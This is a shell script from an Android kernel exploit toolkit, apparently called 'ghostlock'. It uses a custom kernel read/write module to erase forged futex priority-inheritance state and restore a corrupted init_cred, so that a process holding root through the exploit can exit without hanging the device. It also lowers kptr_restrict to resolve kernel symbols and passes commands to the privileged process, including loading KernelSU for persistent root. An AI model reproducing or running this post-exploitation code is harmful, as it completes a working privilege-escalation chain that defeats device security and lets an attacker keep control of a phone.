#!/system/bin/sh
# cleanup-parked.sh — erase a parked ghostlock process's forged PI state with
# kread_min's /proc/kread + /proc/kwrite, verify the result, and only then let
# that process die.
#
# Why this is needed: the MulticastWaiter write leaves rb-tree links pointing at
# the forged objects and (for WriteMode::Credential) performs one collateral
# store into the object the value points at.  If the process that owns that
# state exits before it is erased, the kernel's <exit_pi_state_list> walk
# follows the forged pointers and wedges the machine (observed twice: exit=0,
# then screen frozen, adb dead, no panic).
#
# Prerequisites
#   * kread_min.ko loaded (finit_module) -> /proc/kread, /proc/kwrite exist
#   * uid 0 (the proc files are 0600); no capabilities needed
#   * the parked run's log, so the two addresses can be parsed, or pass them
#
# Usage
#   cleanup-parked.sh                 # dry run: read + print only (default)
#   cleanup-parked.sh --apply         # perform the writes, then verify
#   cleanup-parked.sh --apply <T> <IC>   # explicit task / init_cred addresses
#   GL_LOG=/path/to/log cleanup-parked.sh            # non-default log
#
# Offsets, this device (5.15.180-android13-8-o-01176-g6333b0dbc8ed):
#   task+0x5d8 pid            task+0x790 real_cred     task+0x798 cred
#   task+0x884 pi_lock        task+0x898 pi_waiters.rb_node
#   task+0x8a0 rb_leftmost    task+0x8a8 pi_top_task   task+0x8b0 pi_blocked_on
#   task+0x9a0 pi_state_list.next        task+0x9a8 pi_state_list.prev
#   pi_lock/pi_state_list offsets were read out of exit_pi_state_list
#   (add x20,x0,#0x884 / add x21,x0,#0x9a0); the pi_waiters/pi_top_task/
#   pi_blocked_on quartet comes from the device profile (task_pi_* fields),
#   which matches that disassembly.
#
# init_cred's first 8 bytes are {usage, uid}: restore {usage=4, uid=gid=0}.
# If you used WriteMode::Credential through the TCP zerocopy route instead, the
# collateral store landed on init_cred+8 = {gid, suid} -- also 0, so the same
# 16 zero bytes at init_cred cover both routes.

set -u

APPLY=0
[ "${1:-}" = "--apply" ] && { APPLY=1; shift; }

GL_DIR=${GL_DIR:-/data/local/tmp/gl-w1}
GL_LOG=${GL_LOG:-$GL_DIR/w1c-self.log}
T=${1:-}
IC=${2:-}
PID=${3:-}

# Driver mode: with no explicit addresses, walk the receipts the parked processes
# left in <home>/parked.d and clean each one in a fresh invocation.  There is one
# park state per process -- the W1 process and the self-root process are two
# independent parks, each with its own payload page and its own PI fields.
# GL_ONE stops the recursion.
if [ -z "$T" ] && [ -z "${GL_ONE:-}" ] && [ -z "${PID:-}" ] && [ -d "$GL_DIR/parked.d" ]; then
    found=0
    failed=0
    for f in "$GL_DIR"/parked.d/*; do
        [ -f "$f" ] || continue
        found=1
        t=$(sed -n 's/^task=//p' "$f" | head -1)
        i=$(sed -n 's/^init_cred=//p' "$f" | head -1)
        p=$(sed -n 's/^pid=//p' "$f" | head -1)
        c=$(sed -n 's/^cmd=//p' "$f" | head -1)
        echo "=== parked receipt $f"
        if [ "$APPLY" = 1 ]; then
            GL_ONE=1 GL_CMD="$c" sh "$0" --apply "$t" "$i" "$p" || failed=1
        else
            GL_ONE=1 GL_CMD="$c" sh "$0" "$t" "$i" "$p" || failed=1
        fi
    done
    if [ "$found" != 1 ]; then
        echo "no receipts in $GL_DIR/parked.d"
    elif [ "$failed" = 1 ]; then
        echo "RESULT: at least one park state is NOT clean -- leave those processes alone"
        exit 1
    fi
    exit 0
fi

# kread_min may not be loaded yet: the parked process's GHOSTLOCK_LOAD_KO can
# have failed (bad vermagic/CRC/refused signature), or this is the fallback run
# from an ordinary root shell after KernelSU is up.  Loading it needs
# CAP_SYS_MODULE, so only a full root shell can do it -- try, and print dmesg so
# the reason (vermagic / disagrees about version / EPERM) is visible.
GL_KO=${GL_KO:-/sdcard/kread_min.ko}
if [ ! -r /proc/kread ] || [ ! -w /proc/kwrite ]; then
    echo "kread_min not loaded; trying insmod $GL_KO"
    if [ -f "$GL_KO" ]; then
        insmod "$GL_KO" 2>&1 || true
        dmesg 2>/dev/null | tail -3
    else
        echo "  $GL_KO not found"
    fi
fi
if [ ! -r /proc/kread ] || [ ! -w /proc/kwrite ]; then
    echo "kread_min unavailable: /proc/kread and /proc/kwrite must exist."
    echo "Run this from a full root shell (CAP_SYS_MODULE), or fix GHOSTLOCK_LOAD_KO first."
    exit 2
fi

T=${T#0x}
IC=${IC#0x}

# ---------------------------------------------------------------- helpers ----
# addoff <64bit-hex> <decimal offset> -> 64bit hex (split so no 64-bit math in sh)
addoff() {
    hi=${1%????????}
    lo=${1#$hi}
    n=$((0x$lo + $2))
    if [ "$n" -gt 4294967295 ]; then
        n=$((n - 4294967296))
        hi=$(printf '%08x' $((0x$hi + 1)))
    fi
    printf '%s%08x' "$hi" "$n"
}

# le <hex> -> same value as memory-order byte pairs (little-endian)
le() {
    echo "$1" | sed 's/../& /g' | awk '{ for (i = NF; i >= 1; i--) printf "%s", $i }'
}

# kr <addr-hex> <len> -> value as hex, little-endian reassembled from the dump
kr() {
    echo "0x$1 $2" > /proc/kread
    cat /proc/kread | awk '
        /^[0-9a-f]+  / {
            s = ""
            for (i = 2; i <= NF; i++) {
                if (substr($i, 1, 1) == "|") break
                s = $i s
            }
            printf "%s", s
            exit
        }'
}

# kw <addr-hex> <memory-order-hexbytes> -> prints the driver's own read-back
kw() {
    echo "0x$1 $2" > /proc/kwrite
    cat /proc/kwrite | sed -n 1p
}

# zero-pad to 16 hex digits; a failed read therefore becomes all-zero, which is
# why every write that must not be all-zero is guarded by hexok() first
field() {
    printf '%016s' "${1:-0}" | tr ' ' '0'
}

hexok() { # hexok <string> -> true when it is exactly 16 lowercase hex digits
    [ ${#1} -eq 16 ] || return 1
    case "$1" in *[!0-9a-f]*) return 1 ;; esac
    return 0
}

# ------------------------------------------------------------ locate task ----
# suboff <64bit-hex> <decimal offset> -> 64bit hex
suboff() {
    hi=${1%????????}
    lo=${1#$hi}
    n=$((0x$lo - $2))
    if [ "$n" -lt 0 ]; then
        n=$((n + 4294967296))
        hi=$(printf '%08x' $((0x$hi - 1)))
    fi
    printf '%s%08x' "$hi" "$n"
}

# kptr_restrict is 2 on this handset, so /proc/kallsyms is zeroed for everyone --
# but root may lower it, so do that for the lookup and put it back on exit.
KPTR_SAVE=
kptr_restore() {
    if [ -n "$KPTR_SAVE" ] && [ "$KPTR_SAVE" != 0 ]; then
        echo "$KPTR_SAVE" > /proc/sys/kernel/kptr_restrict 2>/dev/null
    fi
    return 0
}
trap kptr_restore EXIT INT TERM HUP

sym() { # sym <name> -> address from /proc/kallsyms
    awk -v n="$1" '$3 == n { print $1; exit }' /proc/kallsyms
}

kr_ascii() { # kr_ascii <addr-hex> <len> -> printable column, pipes stripped
    echo "0x$1 $2" > /proc/kread
    cat /proc/kread | awk '
        /^[0-9a-f]+  / {
            for (i = 2; i <= NF; i++)
                if (substr($i, 1, 1) == "|") { print $i; exit }
        }' | tr -d '|'
}

# walk init_task.tasks (offset 0x4d0) for the parked process: comm is set to
# "ghostlock" by the exploit, and pid lives at task+0x5d8
find_parked_task() {
    head=$(addoff "$1" 0x4d0)
    p=$(kr "$head" 8)
    i=0
    while [ -n "$p" ] && [ "$p" != "$head" ] && [ "$i" -lt 8192 ]; do
        t=$(suboff "$p" 0x4d0)
        comm=$(kr_ascii "$(addoff "$t" 0x7a8)" 16)
        case "$comm" in
            ghostlock*) echo "$t"; return 0 ;;
        esac
        p=$(kr "$p" 8)
        i=$((i + 1))
    done
    return 1
}

# task_struct by pid: compare the pid int at task+0x5d8.  Pids are unique, so a
# parked process is identifiable even when it left no receipt (older build).
find_task_by_pid() {
    head=$(addoff "$1" 0x4d0)
    p=$(kr "$head" 8)
    i=0
    while [ -n "$p" ] && [ "$p" != "$head" ] && [ "$i" -lt 8192 ]; do
        t=$(suboff "$p" 0x4d0)
        v=$(kr "$(addoff "$t" 0x5d8)" 8)
        if [ "${v#????????}" = "$(printf '%08x' "$2")" ]; then
            echo "$t"
            return 0
        fi
        p=$(kr "$p" 8)
        i=$((i + 1))
    done
    return 1
}

if [ -z "$T" ] || [ -z "$IC" ]; then
    KPTR_SAVE=$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)
    if [ -n "$KPTR_SAVE" ] && [ "$KPTR_SAVE" != 0 ]; then
        if echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null; then
            echo "kptr_restrict: $KPTR_SAVE -> 0 (restored on exit)"
        fi
    fi
    it=$(sym init_task)
    [ -n "$IC" ] || IC=$(sym init_cred)
    if [ -z "$T" ] && [ -n "$it" ]; then
        if [ -n "$PID" ]; then
            T=$(find_task_by_pid "$it" "$PID")
            [ -n "$T" ] || echo "pid $PID not found in init_task.tasks"
        else
            T=$(find_parked_task "$it")
        fi
    fi
fi
if [ -z "$T" ] || [ -z "$IC" ]; then
    if [ -r "$GL_LOG" ]; then
        [ -n "$T" ] || T=$(grep -a 'self task=0x' "$GL_LOG" | tail -1 | sed 's/.*self task=0x//' | cut -c1-16)
        [ -n "$IC" ] || IC=$(grep -a 'init_cred image=' "$GL_LOG" | tail -1 | sed 's/.*alias=0x//' | cut -c1-16)
    fi
fi
if [ -z "$T" ] || [ -z "$IC" ]; then
    echo "could not locate the parked task / init_cred (GL_LOG=$GL_LOG)"
    echo "usage: $0 [--apply] <task_addr_hex> <init_cred_addr_hex>"
    exit 2
fi
T=${T#0x}
IC=${IC#0x}
echo "task      = 0x$T   comm=$(kr_ascii "$(addoff "$T" 0x7a8)" 16)"
echo "init_cred = 0x$IC"
[ "$APPLY" = 1 ] && echo "mode      = APPLY (writes)" || echo "mode      = dry run (no writes; pass --apply)"

# ------------------------------------------------------------------- read ----
RC_SAVE=$(kr "$(addoff "$T" 0x790)" 8)
CR_SAVE=$(kr "$(addoff "$T" 0x798)" 8)
IC0=$(kr "$IC" 16)
PS_NEXT=$(kr "$(addoff "$T" 0x9a0)" 8)
PS_PREV=$(kr "$(addoff "$T" 0x9a8)" 8)
PW_NODE=$(kr "$(addoff "$T" 0x898)" 8)
PW_LEFT=$(kr "$(addoff "$T" 0x8a0)" 8)
PW_TOP=$(kr "$(addoff "$T" 0x8a8)" 8)
PW_BLOCKED=$(kr "$(addoff "$T" 0x8b0)" 8)

echo "---- before ----"
echo "real_cred        = 0x$(field "$RC_SAVE")"
echo "cred             = 0x$(field "$CR_SAVE")"
echo "init_cred[0..16] = $IC0"
echo "pi_state_list    = 0x$(field "$PS_NEXT") / 0x$(field "$PS_PREV")"
echo "pi_waiters.node  = 0x$(field "$PW_NODE")"
echo "rb_leftmost      = 0x$(field "$PW_LEFT")"
echo "pi_top_task      = 0x$(field "$PW_TOP")"
echo "pi_blocked_on    = 0x$(field "$PW_BLOCKED")"

SELF=$(addoff "$T" 0x9a0)

if [ "$APPLY" != 1 ]; then
    echo "---- would write ----"
    echo "0x$SELF  $(le "$SELF")$(le "$SELF")          # pi_state_list self-link"
    echo "0x$(addoff "$T" 0x898)  00000000000000000000000000000000   # pi_waiters.rb_node + rb_leftmost"
    echo "0x$(addoff "$T" 0x8a8)  00000000000000000000000000000000   # pi_top_task + pi_blocked_on"
    echo "0x$IC  04000000000000000000000000000000   # usage=4, uid=gid=0"
    LE_RC=$(le "$(field "$RC_SAVE")")
    LE_CR=$(le "$(field "$CR_SAVE")")
    echo "0x$(addoff "$T" 0x790)  ${LE_RC}${LE_CR}   # creds back to the backup"
    echo "(re-run with --apply)"
    exit 0
fi

# ------------------------------------------------------------------ write ----
echo "---- writing ----"
kw "$SELF" "$(le "$SELF")$(le "$SELF")"
kw "$(addoff "$T" 0x898)" "00000000000000000000000000000000"
kw "$(addoff "$T" 0x8a8)" "00000000000000000000000000000000"
kw "$IC" "04000000000000000000000000000000"
# only restore the creds if they actually point at init_cred (i.e. the write
# landed); otherwise leave the backup alone -- rewriting the same values is
# harmless, rewriting a *different* cred pointer you did not expect is not.
# The creds are deliberately NOT restored: ghostlock has no arbitrary read, so
# there is no "original value" to write back, and a failed backup read must never
# turn into writing 16 zero bytes into task->cred.  Once the PI links below are
# erased, the exit path is clean and the process is killed -- exit_creds then
# puts the fake cred twice against its large usage counter (which never reaches
# zero), and the payload page is released with nobody pointing at it.
[ -n "$RC_SAVE" ] && echo "cred backup (informational): 0x$RC_SAVE 0x$CR_SAVE"

# ----------------------------------------------------------------- verify ----
PS_NEXT=$(kr "$(addoff "$T" 0x9a0)" 8)
PS_PREV=$(kr "$(addoff "$T" 0x9a8)" 8)
PW_NODE=$(kr "$(addoff "$T" 0x898)" 8)
PW_LEFT=$(kr "$(addoff "$T" 0x8a0)" 8)
PW_TOP=$(kr "$(addoff "$T" 0x8a8)" 8)
PW_BLOCKED=$(kr "$(addoff "$T" 0x8b0)" 8)
IC0=$(kr "$IC" 16)

echo "---- after ----"
echo "pi_state_list    = 0x$(field "$PS_NEXT") / 0x$(field "$PS_PREV")   (want 0x$(field "$SELF") twice)"
echo "pi_waiters.node  = 0x$(field "$PW_NODE")"
echo "rb_leftmost      = 0x$(field "$PW_LEFT")"
echo "pi_top_task      = 0x$(field "$PW_TOP")"
echo "pi_blocked_on    = 0x$(field "$PW_BLOCKED")"
echo "init_cred[0..16] = $IC0"

ok=1
[ "$(field "$PS_NEXT")" = "$(field "$SELF")" ] || ok=0
[ "$(field "$PS_PREV")" = "$(field "$SELF")" ] || ok=0
case "$PW_NODE" in *[!0]*) ok=0 ;; esac
case "$PW_LEFT" in *[!0]*) ok=0 ;; esac
case "$PW_TOP" in *[!0]*) ok=0 ;; esac
case "$PW_BLOCKED" in *[!0]*) ok=0 ;; esac
case "$IC0" in 04000000000000000000000000000000*) ;; *) ok=0 ;; esac

if [ "$ok" = 1 ]; then
    echo "RESULT: clean -- the park state is gone, the process may die now."
    # Privileged follow-ups (notably /data/adb/ksud late-load, which installs
    # kernelsu.ko for persistent root) cannot run from here: this client keeps
    # the app-zygote bounding set (0x8000c0), so CAP_SYS_MODULE is unavailable.
    # The parked process has it and main.cpp polls for <home>/parked.d/<pid>.cmd,
    # so hand the command over and wait for <pid>.done before killing it -- the
    # child it forks execs, i.e. it runs on a real cred and outlives us.
    if [ -n "${GL_CMD:-}" ] && [ -n "$PID" ] && [ -n "${GL_DIR:-}" ]; then
        rm -f "$GL_DIR/parked.d/$PID.done"
        printf '%s\n' "$GL_CMD" > "$GL_DIR/parked.d/$PID.cmd"
        echo "handed to parked pid=$PID: $GL_CMD"
        k=0
        while [ "$k" -lt 60 ] && [ ! -f "$GL_DIR/parked.d/$PID.done" ]; do
            sleep 1
            k=$((k + 1))
        done
        if [ -f "$GL_DIR/parked.d/$PID.done" ]; then
            echo "parked process reports done (see its log)"
        else
            echo "WARNING: no .done after 60s -- the command may still be running"
            echo "         (e.g. it restarted adbd); check $GL_LOG before killing"
        fi
    fi
    if [ -n "$PID" ]; then
        if kill -9 "$PID" 2>/dev/null; then
            echo "killed parked pid=$PID"
        else
            echo "kill -9 $PID failed (already gone?)"
        fi
    else
        echo "no pid in this invocation; kill the parked process yourself"
    fi
else
    echo "RESULT: NOT clean -- do NOT let the parked process exit; re-check the"
    echo "        fields above (a failed kread shows as a short/empty value)."
    exit 1
fi
